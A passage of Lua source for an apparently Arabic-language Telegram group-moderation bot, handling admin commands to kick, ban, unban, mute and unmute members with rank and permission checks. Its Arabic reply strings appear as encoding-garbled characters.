mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±" and ChCheck(msg) or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ―" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:KickBan"..msg.chat_id_,"true")
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΨͺΩ" and ChCheck(msg) or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΩΩΨ―" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ―'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ" and ChCheck(msg) or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΩΩΨ―" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_,"true")
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ―'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ" and ChCheck(msg) or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:ProSet"..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ±ΩΨΉ β Ψ§ΩΨ§Ψ―ΩΩ β’ Ψ§ΩΩΩΩΨ²', 1, 'md')
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ" and ChCheck(msg) or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:ProSet"..msg.chat_id_,"true")
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ±ΩΨΉ β Ψ§ΩΨ§Ψ―ΩΩ β’ Ψ§ΩΩΩΩΨ²', 1, 'md')
end
end
--     Source Escobar     --
--          Kick          --
if Admin(msg) then
if text ==('Ψ·Ψ±Ψ―') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ β *'..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ·Ωΰ’ͺΪΩΫ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^Ψ·Ψ±Ψ― @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ·Ψ±Ψ― @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ β  * '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ·Ωΰ’ͺΪΩΫ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end,nil)
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^Ψ·Ψ±Ψ― (%d+)') and ChCheck(msg) then
local user = text:match('Ψ·Ψ±Ψ― (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ωΰ’ͺΪ ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ β * '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ·Ωΰ’ͺΪ ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ·Ωΰ’ͺΪΩΫ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end,nil)
end
end
end 
--     Source Escobar     --
--          Ban           --
if Admin(msg) then
if text ==('Ψ­ΨΆΨ±') or text ==('Ψ­ΨΈΨ±') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^Ψ­ΨΆΨ± @(.*)') or text:match('^Ψ­ΨΈΨ± @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ­ΨΆΨ± @(.*)') or text:match('^Ψ­ΨΈΨ± @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± β * '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end,nil) 
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^Ψ­ΨΆΨ± (%d+)') or text:match('^Ψ­ΨΈΨ± (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ­ΨΆΨ± (%d+)') or text:match('Ψ­ΨΈΨ± (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ± ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± β '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"*β β« ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !*") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*") 
return false  
end
ChatKick(msg.chat_id_, user)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end,nil) 
end
end
--     Source Escobar     --
--         UnBan          --
if text ==('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ±') or text ==('Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±') and ChCheck(msg) then
function UnBanReply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± (%d+)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± (%d+)') or text:match('Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)')
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end 
end 
--     Source Escobar     --
--          Mute          --
if Admin(msg) then
if text ==('ΩΨͺΩ') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΩ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^ΩΨͺΩ @(.*)') and ChCheck(msg) then
local username = text:match('^ΩΨͺΩ @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ β * '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","*β β« ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΩ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^ΩΨͺΩ (%d+)') and ChCheck(msg) then
local user = text:match('ΩΨͺΩ (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ β * '..IdRank(user, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","*β β« ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΩ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
end
end
--     Source Escobar     --
--         UnMute         --
if text ==('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΨͺΩ') or text ==('Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΩΩ ΩΩΨ³ ΩΩΨͺΩΩ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€*")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΨͺΩ @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΨͺΩ @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","*β β« ΩΩ ΩΩΨ³ ΩΩΨͺΩΩ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€*")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΨͺΩ (%d+)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΨͺΩ (%d+)') or text:match('Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)')
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","*β β« ΩΩ ΩΩΨ³ ΩΩΨͺΩΩ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€*")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩΩΩΩΫ π€ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
end 
end 
--     Source Escobar     --
--          Tkeed           --
if Admin(msg) then
if text ==('ΨͺΩΩΩΨ―') or text ==('ΨͺΩΩΨ―') and ChCheck(msg) then
function TkeedReply(extra, result, success)
